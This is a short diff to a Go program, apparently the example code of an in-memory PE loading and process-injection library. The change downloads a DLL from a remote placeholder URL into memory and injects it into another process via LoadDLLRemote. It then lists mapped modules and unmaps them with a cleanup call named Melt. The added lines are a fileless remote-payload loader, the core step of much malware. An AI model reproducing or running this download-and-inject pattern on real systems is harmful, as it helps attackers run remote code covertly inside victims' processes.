@@ -38,7 +38,13 @@ if err != nil {
 	fmt.Println("failed to find process", err)
 	return
 }
-_, err = pe.LoadDLLRemote(pHandle, pid, "path/to/dll.dll", "ExportedFunction")
+buff, err := net.DownloadToMemory("https://url.com/file.dll")
+if err != nil {
+	log.Printf("[main] failed to download DLL: %v", err)
+	fmt.Println("failed to download", err)
+	return
+}
+_, err = pe.LoadDLLRemote(pHandle, buff, "ExportedFunction")
 if err != nil {
 	log.Printf("[main] LoadDLLRemote failed: %v", err)
 	fmt.Println("failed to load", err)
@@ -48,6 +54,10 @@ log.Printf("[main] LoadDLLRemote succeeded")
 
 // check currently mapped dlls
 baseAddrs, sizes, count := pe.GetMap()
+fmt.Printf("currently have %d PEs mapped:\n", count)
+for i := 0; i < count; i++ {
+	fmt.Printf("PE %d: Base=0x%X, Size=%d bytes\n", i, baseAddrs[i], sizes[i])
+}
 
 // cleanup/unmap dll from memory
 err = pe.Melt(mapping)
